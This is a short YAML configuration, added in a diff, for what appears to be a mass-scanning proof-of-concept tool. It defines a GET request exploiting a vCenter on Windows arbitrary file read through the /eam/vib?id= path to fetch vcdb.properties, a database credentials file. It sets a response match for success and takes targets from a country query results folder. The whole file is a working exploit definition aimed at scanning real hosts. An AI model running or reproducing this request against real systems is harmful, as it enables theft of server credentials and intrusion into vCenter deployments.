@@ -1,0 +1,16 @@
+targetPath: /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+targetMethod: get
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:8080
+    https: 127.0.0.1:8080
+targetAllowRedirects: false
+targetHeaders:
+targetJson:
+targetData:
+targetReExpression:
+    respStatusCode: 200
+    respBody: root
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/vCenterWindows任意文件读取/
+targetRestText: True
